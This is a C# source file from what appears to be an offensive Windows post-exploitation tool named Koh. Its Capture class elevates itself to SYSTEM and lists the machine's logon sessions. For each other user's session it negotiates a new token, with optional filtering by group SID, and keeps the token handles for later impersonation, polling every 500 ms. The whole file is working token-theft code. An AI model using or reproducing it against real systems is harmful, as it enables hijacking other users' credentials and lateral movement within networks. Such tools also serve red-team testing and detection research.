using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading;

namespace Koh
{
    public class Capture
    {
        // represents a captured logon session
        public struct CapturedSession
        {
            public string UserName;
            public ulong Luid;
            public string SID;
            public string LogonType;
            public string AuthPackage;
            public string UserSID;
            public string CredUser;
            public string OriginLUID;
            public IntPtr TokenHandle;
            public DateTime CaptureTime;
            public CapturedSession(string userName, ulong luid, string sid, string logonType, string authPackage, string userSid, string credUser, string originLUID, IntPtr tokenHandle)
            {
                UserName = userName;
                Luid = luid;
                SID = sid;
                LogonType = logonType;
                AuthPackage = authPackage;
                UserSID = userSid;
                CredUser = credUser;
                OriginLUID = originLUID;
                TokenHandle = tokenHandle;
                CaptureTime = DateTime.Now;
            }
        }

        public static void Sessions(ConcurrentDictionary<string, int> meta, ConcurrentDictionary<string, CapturedSession> capturedSessions, ConcurrentDictionary<string, bool> excludeSids, ConcurrentDictionary<string, bool> filterSids, bool loop = true, bool captureSessions = true, bool DEBUG = false)
        {
            // Main worker function that handles listing/monitoring/capturing new logon sessions

            Console.WriteLine();

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("  [X] Not high integrity!");
                return;
            }

            if (Helpers.IsSystem())
            {
                Console.WriteLine("  [*] Already SYSTEM, not elevating\n");
            }
            else
            {
                if (!Helpers.GetSystem())
                {
                    Console.WriteLine("  [X] Error elevating to SYSTEM!");
                    return;
                }
                Console.WriteLine("  [*] Elevated to SYSTEM\n");
            }

            if ((filterSids != null) && (filterSids.Count > 0))
            {
                Console.WriteLine("  [*] Targeting group SIDs:");
                foreach (var sidString in filterSids.Keys) {
                    Console.WriteLine($"      {sidString}");
                }
            }

            do
            {
                // enumerate current logon sessions
                Dictionary<string, Find.FoundSession> logonSessions = Find.LogonSessions(DEBUG);
                Dictionary<string, Find.FoundSession> logonSessionsToProcess = new Dictionary<string, Find.FoundSession>();
                Dictionary<string, bool> negotiateSessions = new Dictionary<string, bool>();

                // find all "Negotiate" logon session packages so we can prefer to use these
                foreach (KeyValuePair<string, Find.FoundSession> entry in logonSessions)
                {
                    if(entry.Value.AuthPackage == "Negotiate")
                    {
                        string negotiateKey = $"{entry.Value.SID}{entry.Value.LogonType}";
                        if (!negotiateSessions.ContainsKey(negotiateKey))
                        {
                            negotiateSessions.Add(negotiateKey, true);
                        }
                    }
                }

                foreach (KeyValuePair<string, Find.FoundSession> entry in logonSessions)
                {
                    if (captureSessions) {
                        // if we're capturing, ensure we only capture the negotiate session for a SID+LogonType if a negotiate session is present
                        if (entry.Value.AuthPackage == "Negotiate")
                        {
                            if (!logonSessionsToProcess.ContainsKey(entry.Key))
                            {
                                logonSessionsToProcess.Add(entry.Key, entry.Value);
                            }
                            else
                            {
                                logonSessionsToProcess[entry.Key] = entry.Value;
                            }
                        }
                        else
                        {
                            // only add a new session if an equivalent Negotiate logon session is not present
                            if (!negotiateSessions.ContainsKey($"{entry.Value.SID}{entry.Value.LogonType}")) {
                                logonSessionsToProcess.Add(entry.Key, entry.Value);
                            }
                        }
                    }
                    else
                    {
                        logonSessionsToProcess.Add(entry.Key, entry.Value);
                    }
                }

                foreach (KeyValuePair<string, Find.FoundSession> entry in logonSessionsToProcess)
                {
                    string identifier = entry.Key;
                    ulong luid = 0;
                    Find.FoundSession session = entry.Value;

                    if ((capturedSessions.Count >= Program.maxTokens))
                    {
                        if (!Program.maxWarned)
                        {
                            Console.WriteLine($"\n  [*] Hit token capture limit of {Program.maxTokens}, not capturing additional tokens\n");
                            Program.maxWarned = true;
                        }
                        else
                        {
                            continue;
                        }
                    }
                    else
                    {
                        Program.maxWarned = false;
                    }

                    if ( ((!captureSessions && !loop) || !capturedSessions.ContainsKey(identifier)) && !excludeSids.ContainsKey(identifier))
                    {
                        ulong.TryParse(session.Luid, out luid);

                        if (luid != 0)
                        {
                            try
                            {
                                LUID userLuid = new LUID(luid);
                                LUID tokenOrigin = new LUID();
                                
                                // negotiate a new token for this particular LUID
                                IntPtr hToken = Creds.NegotiateToken(userLuid, meta, DEBUG);
                                if (hToken != IntPtr.Zero)
                                {
                                    tokenOrigin = Helpers.GetTokenOrigin(hToken);
                                }
                                
                                if (hToken == IntPtr.Zero)
                                {
                                    Console.WriteLine($"\n  [*] New Logon Session     : {DateTime.Now}");
                                    Console.WriteLine($"      UserName              : {session.UserName}");
                                    Console.WriteLine($"      LUID                  : {session.Luid}");
                                    Console.WriteLine($"      LogonType             : {session.LogonType}");
                                    Console.WriteLine($"      AuthPackage           : {session.AuthPackage}");
                                    Console.WriteLine($"      User SID              : {session.SID}");
                                    Console.WriteLine($"      Credential UserName   : {session.CredentialUserName}");
                                    Console.WriteLine($"      Origin LUID           : {(ulong)tokenOrigin} ({tokenOrigin})");
                                    Console.WriteLine($"\n    [X] Error negotiating a token for LUID {session.Luid} (hToken: {hToken})\n");
                                }
                                else
                                {
                                    // if we're filtering for specific group SIDs
                                    if ((filterSids != null) && (filterSids.Count > 0))
                                    {
                                        bool targetCaptured = false;
                                        foreach (var sidString in filterSids.Keys)
                                        {
                                            if (Helpers.CheckTokenForGroup(hToken, $"{sidString}"))
                                            {
                                                targetCaptured = true;
                                                Console.WriteLine($"\n  [*] New Logon Session     : {DateTime.Now}");
                                                Console.WriteLine($"      UserName              : {session.UserName}");
                                                Console.WriteLine($"      LUID                  : {session.Luid}");
                                                Console.WriteLine($"      LogonType             : {session.LogonType}");
                                                Console.WriteLine($"      AuthPackage           : {session.AuthPackage}");
                                                Console.WriteLine($"      User SID              : {session.SID}");
                                                Console.WriteLine($"      Credential UserName   : {session.CredentialUserName}");
                                                Console.WriteLine($"      Origin LUID           : {(ulong)tokenOrigin} ({tokenOrigin})");

                                                if (captureSessions)
                                                {
                                                    if (capturedSessions.Count < Program.maxTokens)
                                                    {
                                                        // if we're doing "capture"
                                                        Console.WriteLine($"\n      [*] Successfully negotiated a token for LUID {session.Luid} (hToken: {hToken})\n");
                                                        CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $"{session.LogonType}", session.AuthPackage, session.SID, session.CredentialUserName, $"{(ulong)tokenOrigin}", hToken);
                                                        capturedSessions.TryAdd(identifier, captureSession);
                                                    }
                                                    else
                                                    {
                                                        // hit our token limit
                                                        Console.WriteLine($"\n      [*] Hit token capture limit of {Program.maxTokens}, not capturing additional tokens\n");
                                                        Interop.CloseHandle(hToken);
                                                    }
                                                }
                                                else
                                                {
                                                    // if we're doing "list" or monitor" close the token off to free it up
                                                    Interop.CloseHandle(hToken);

                                                    // if we're doing "monitor" add the observed session to the list
                                                    if (loop)
                                                    {
                                                        CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $"{session.LogonType}", session.AuthPackage, session.SID, session.CredentialUserName, $"{(ulong)tokenOrigin}", IntPtr.Zero);
                                                        capturedSessions.TryAdd(identifier, captureSession);
                                                    }
                                                }
                                            }
                                        }
                                        if (!targetCaptured)
                                        {
                                            // if the token does not match any filtering, add it to the exclude list
                                            Interop.CloseHandle(hToken);
                                            excludeSids.TryAdd(identifier, true);
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine($"\n  [*] New Logon Session     : {DateTime.Now}");
                                        Console.WriteLine($"      UserName              : {session.UserName}");
                                        Console.WriteLine($"      LUID                  : {session.Luid}");
                                        Console.WriteLine($"      LogonType             : {session.LogonType}");
                                        Console.WriteLine($"      AuthPackage           : {session.AuthPackage}");
                                        Console.WriteLine($"      User SID              : {session.SID}");
                                        Console.WriteLine($"      Credential UserName   : {session.CredentialUserName}");
                                        Console.WriteLine($"      Origin LUID           : {(ulong)tokenOrigin} ({tokenOrigin})");

                                        if (captureSessions)
                                        {
                                            if (capturedSessions.Count < Program.maxTokens)
                                            {
                                                // if we're doing "capture"
                                                Console.WriteLine($"\n      [*] Successfully negotiated a token for LUID {session.Luid} (hToken: {hToken})\n");
                                                CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $"{session.LogonType}", session.AuthPackage, session.SID, session.CredentialUserName, $"{(ulong)tokenOrigin}", hToken);
                                                capturedSessions.TryAdd(identifier, captureSession);
                                            }
                                            else
                                            {
                                                // hit our token limit
                                                Console.WriteLine($"\n      [*] Hit token capture limit of {Program.maxTokens}, not capturing additional tokens\n");
                                                Interop.CloseHandle(hToken);
                                            }
                                        }
                                        else
                                        {
                                            // if we're doing "list" or monitor"
                                            Interop.CloseHandle(hToken);

                                            // if we're doing "monitor"
                                            if (loop)
                                            {
                                                CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $"{session.LogonType}", session.AuthPackage, session.SID, session.CredentialUserName, $"{(ulong)tokenOrigin}", IntPtr.Zero);
                                                capturedSessions.TryAdd(identifier, captureSession);
                                            }
                                        }
                                    }
                                }
                            }
                            catch(Exception e)
                            {
                                Console.WriteLine($"  [!] Exception: ${e}");
                            }
                        }
                    }
                }

                if (captureSessions)
                {
                    // if we're capturing sessions, check every 500ms
                    Thread.Sleep(500);
                }

                if((capturedSessions.Count == 0) && (meta["AcquireCredentialsHandleError"] > 0))
                {
                    // if we haven't captured any sessions and we have more than one error for AcquireCredentialsHandle, signal for exit
                    Console.WriteLine("\n[X] No sessions captured and error with AcquireCredentialsHandle, exiting...");
                    meta["SignalExit"] = 1;
                }
            }
            while (loop && (meta["SignalExit"] != 1));

            Interop.RevertToSelf();
        }
    }
}
